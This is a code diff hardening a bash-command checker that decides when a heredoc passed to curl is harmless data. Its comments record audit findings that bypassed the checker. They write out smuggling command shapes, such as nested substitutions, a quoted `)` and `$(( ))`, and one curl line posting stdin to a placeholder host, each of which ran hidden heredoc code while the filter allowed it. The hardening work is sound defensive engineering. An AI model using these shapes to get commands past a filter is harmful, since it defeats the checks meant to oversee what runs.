@@ -543,22 +543,26 @@ export function stripHeredocDataPayloads(command) {
   let out = ''
   let i = 0
   let boundary = 0 // index where the CURRENT simple command started
-  // Saved boundaries, one per OPEN nested command context. A `$( )` / `<( )` / `>( )` / backtick
-  // starts a new simple command inside it, and its CLOSE returns to the one that was running --
-  // so the outer boundary has to be remembered, not recomputed. See the two findings below.
+  // Bash QUOTING state for the context being walked: null (unquoted), "'", '"', or "$'"
+  // (ANSI-C). A walker that tracks parentheses but not quoting disagrees with bash exactly
+  // where the attacker gets to choose the shape -- see F-5 below.
+  let quote = null
+  // One frame per OPEN nested command context. A `$( )` / `<( )` / `>( )` / backtick starts a
+  // new simple command AND a fresh quoting context inside it, and its CLOSE returns to both --
+  // so the outer boundary and the outer quote have to be remembered, not recomputed. See the
+  // findings below.
   const nestStack = []
   while (i < src.length) {
     const c = src[i]
-    if (c === ';' || c === '&' || c === '|' || c === '\n') { out += c; i++; boundary = i; continue }
-    // A NESTED COMMAND CONTEXT STARTS A NEW SIMPLE COMMAND, AND ITS CLOSE ENDS IT. Two NO-GOs on
-    // card 84e31b40, one from each side of this same boundary:
+    // A NESTED COMMAND CONTEXT STARTS A NEW SIMPLE COMMAND, AND ITS CLOSE ENDS IT. Three NO-GOs
+    // on card 84e31b40, from three different sides of this same boundary:
     //
     //  * Cybered (F-1): stepping only at `;`/`&`/`|`/newline let an INNER interpreter's heredoc
     //    measure its span from the OUTER curl -- `curl ... -d @- "$(python3 <<'PY' ... PY)"` --
     //    so the body was blanked while bash genuinely ran it (proven by a marker file written
     //    from inside the blanked region).
     //
-    //  * Cybersec (F-2): my first fix stepped at the OPENERS only, on the claim that a heredoc
+    //  * Cybersec (F-2): the first fix stepped at the OPENERS only, on the claim that a heredoc
     //    after a substitution "fails the leading-binary check, never a bypass". That claim was
     //    wrong. The span then starts INSIDE the substitution, so if the substitution itself
     //    begins with curl -- `python3 $(curl -d @- http://x) <<'PY'` -- it passes both ownership
@@ -566,29 +570,84 @@ export function stripHeredocDataPayloads(command) {
     //    `>( )` all flipped to allow; backticks stayed denied only by accident, because a closing
     //    backtick re-matches the opener pattern.
     //
-    // Stepping at the closers (the one-line fix proposed with that finding) closes all four, but
-    // measurement showed it trades them for a new one: `python3 $()curl -d @- <<'PY'` puts curl at
-    // the start of a span that begins just after `)`, while bash's argv is [python3, curl, -d, @-]
-    // and python3 executes the heredoc. RESTORING the saved outer boundary closes that too, and
-    // additionally keeps a legitimate payload whose command merely CONTAINS a substitution
-    // (`curl -H "Authorization: Bearer $(cat tok)" -d @- <<'JSON'`) on the allow side, which
-    // closer-stepping turns into a false positive.
+    //    Stepping at the closers (the one-line fix proposed with that finding) closes all four,
+    //    but measurement showed it trades them for a new one: `python3 $()curl -d @- <<'PY'` puts
+    //    curl at the start of a span that begins just after `)`, while bash's argv is
+    //    [python3, curl, -d, @-] and python3 executes the heredoc. RESTORING the saved outer
+    //    boundary closes that too, and additionally keeps a legitimate payload whose command
+    //    merely CONTAINS a substitution (`curl -H "Authorization: Bearer $(cat tok)" -d @-
+    //    <<'JSON'`) on the allow side, which closer-stepping turns into a false positive.
+    //
+    //  * Cybered (F-5): the saved-boundary stack was a PURE PARENTHESIS COUNTER. Bash is not: a
+    //    quoted `)` is a literal, and `$(( ))` is arithmetic whose second `)` closes nothing.
+    //    Both make the stack pop a frame bash never opened, dropping the boundary back onto the
+    //    OUTER curl while the heredoc still belongs to the INNER interpreter --
+    //    `curl ... -d @- $(python3 - "a)b" <<'PY' ... PY)` and the `$((1+1))` variant were both
+    //    measured executing from inside a blanked body. A quoted `)` is not an exotic shape: a
+    //    regex, a sentence, a `print('a)b')` all contain one. So the walker now tracks quoting
+    //    the way bash does -- inside '...' nothing is live at all, inside "..." only
+    //    substitutions are -- and skips `$(( ))` whole.
+    //
+    // Backslash handling falls out of the same requirement: `\$(` looks like an opener and never
+    // opens one (Cybersec S5), and `\<newline>` is a line continuation, not a command boundary.
+    if (c === '\\') {
+      if (quote === "'") { out += c; i++; continue } // literal inside single quotes
+      out += src.slice(i, i + 2); i += 2; continue
+    }
+    // Inside '...' and $'...' NOTHING is live: not `)`, not a backtick, not a separator.
+    if (quote === "'" || quote === "$'") {
+      out += c; i++
+      if (c === "'") quote = null
+      continue
+    }
+    if (quote === '"') {
+      if (c === '"') { out += c; i++; quote = null; continue }
+      // inside "..." only substitutions stay live -- fall through to those checks
+    } else {
+      if (c === "'") { out += c; i++; quote = "'"; continue }
+      if (c === '"') { out += c; i++; quote = '"'; continue }
+      if (c === '$' && src[i + 1] === "'") { out += "$'"; i += 2; quote = "$'"; continue }
+    }
+    // `$(( ... ))` is ARITHMETIC, not a command context. Consume it whole so its closing `))`
+    // cannot pop a frame it never pushed (Cybered N2, Cybersec S1).
+    if (c === '$' && src[i + 1] === '(' && src[i + 2] === '(') {
+      let depth = 0
+      let j = i + 1
+      while (j < src.length) {
+        if (src[j] === '(') depth++
+        else if (src[j] === ')') { depth--; if (depth === 0) { j++; break } }
+        j++
+      }
+      out += src.slice(i, j); i = j; continue
+    }
+    // Command separators separate only OUTSIDE quotes -- a `;` or a newline inside "..." is text.
+    if (quote === null && (c === ';' || c === '&' || c === '|' || c === '\n')) {
+      out += c; i++; boundary = i; continue
+    }
     if (c === '`') {
       out += c; i++
       // One character, two meanings: it closes the context it opened, otherwise it opens one.
-      if (nestStack.length && nestStack[nestStack.length - 1].tick) boundary = nestStack.pop().at
-      else { nestStack.push({ at: boundary, tick: true }); boundary = i }
+      const top = nestStack[nestStack.length - 1]
+      if (top && top.tick) { nestStack.pop(); boundary = top.at; quote = top.quote }
+      else { nestStack.push({ at: boundary, quote, tick: true }); boundary = i; quote = null }
       continue
     }
-    if (c === ')' && nestStack.length && !nestStack[nestStack.length - 1].tick) {
-      out += c; i++; boundary = nestStack.pop().at; continue
+    if (c === ')' && quote === null && nestStack.length && !nestStack[nestStack.length - 1].tick) {
+      out += c; i++
+      const frame = nestStack.pop()
+      boundary = frame.at; quote = frame.quote
+      continue
     }
-    const nested = /^(?:\$\(|<\(|>\()/.exec(src.slice(i))
+    // Process substitution does not happen inside double quotes; command substitution does.
+    const nested = (quote === '"' ? /^\$\(/ : /^(?:\$\(|<\(|>\()/).exec(src.slice(i))
     if (nested) {
-      nestStack.push({ at: boundary, tick: false })
-      out += nested[0]; i += nested[0].length; boundary = i; continue
+      nestStack.push({ at: boundary, quote, tick: false })
+      out += nested[0]; i += nested[0].length; boundary = i; quote = null
+      continue
     }
-    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(src.slice(i))
+    // A heredoc redirect is a redirect only outside quotes; inside a string `<<TAG` is text.
+    const here =
+      quote === null ? /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(src.slice(i)) : null
     if (!here) { out += c; i++; continue }
     const span = src.slice(boundary, i)
     const feedsCurlStdin = CURL_LEADING_RX.test(span) && CURL_STDIN_DATA_RX.test(span)
